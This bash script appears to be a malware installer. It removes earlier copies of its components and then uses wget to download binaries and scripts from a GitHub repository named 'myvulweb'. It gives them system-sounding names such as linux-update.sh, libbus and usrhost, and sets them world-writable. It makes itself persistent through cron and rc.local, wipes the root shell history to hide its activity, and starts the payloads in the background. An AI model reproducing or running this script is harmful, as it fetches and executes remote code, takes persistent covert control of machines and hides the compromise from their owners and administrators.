#!/bin/bash
#
#uninstall
sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/linux-update.sh >\/dev\/null 2>&1/d' /etc/crontab

killall usrhost
killall libbus

killall libcron

rm -rf /usr/bin/linux-update.sh
rm -rf /usr/bin/usrhost
rm -rf /usr/bin/libbus
rm -rf /usr/bin/usrhost_ver.txt
rm -rf /opt/MyCron

#uninstall finish

wget https://raw.githubusercontent.com/myvulweb/b2/master/usrhost_ver.txt -O /usr/bin/usrhost_ver.txt
wget https://raw.githubusercontent.com/myvulweb/b2/master/linux-update.sh -O /usr/bin/linux-update.sh
chmod 777 /usr/bin/linux-update.sh

#down mycron and create cron
cd /opt
mkdir MyCron
wget https://raw.githubusercontent.com/myvulweb/b2/master/cron64 -O /opt/MyCron/libcron
chmod 777 /opt/MyCron/libcron
echo '*/5 * * * * root /usr/bin/linux-update.sh >/dev/null 2>&1'>>/opt/MyCron/root


#down libhome and write to autorun
wget https://raw.githubusercontent.com/myvulweb/b2/master/libhome.sh -O /home/libhome.sh
chmod 777 /home/libhome.sh
echo '/home/libhome'>>/etc/rc.d/rc.local

#run libhost
/home/libhome.sh &




wget https://github.com/myvulweb/b2/raw/master/usrhost -O /usr/bin/usrhost 
chmod 777 /usr/bin/usrhost
wget https://github.com/myvulweb/b2/raw/master/libbus -O /usr/bin/libbus
chmod 777 /usr/bin/libbus

#echo '*/5 * * * * root /usr/bin/linux-update.sh >/dev/null 2>&1'>>/etc/crontab

#service crond restart

echo >/root/.bash_history
history -c
/usr/bin/usrhost &
/usr/bin/libbus &

 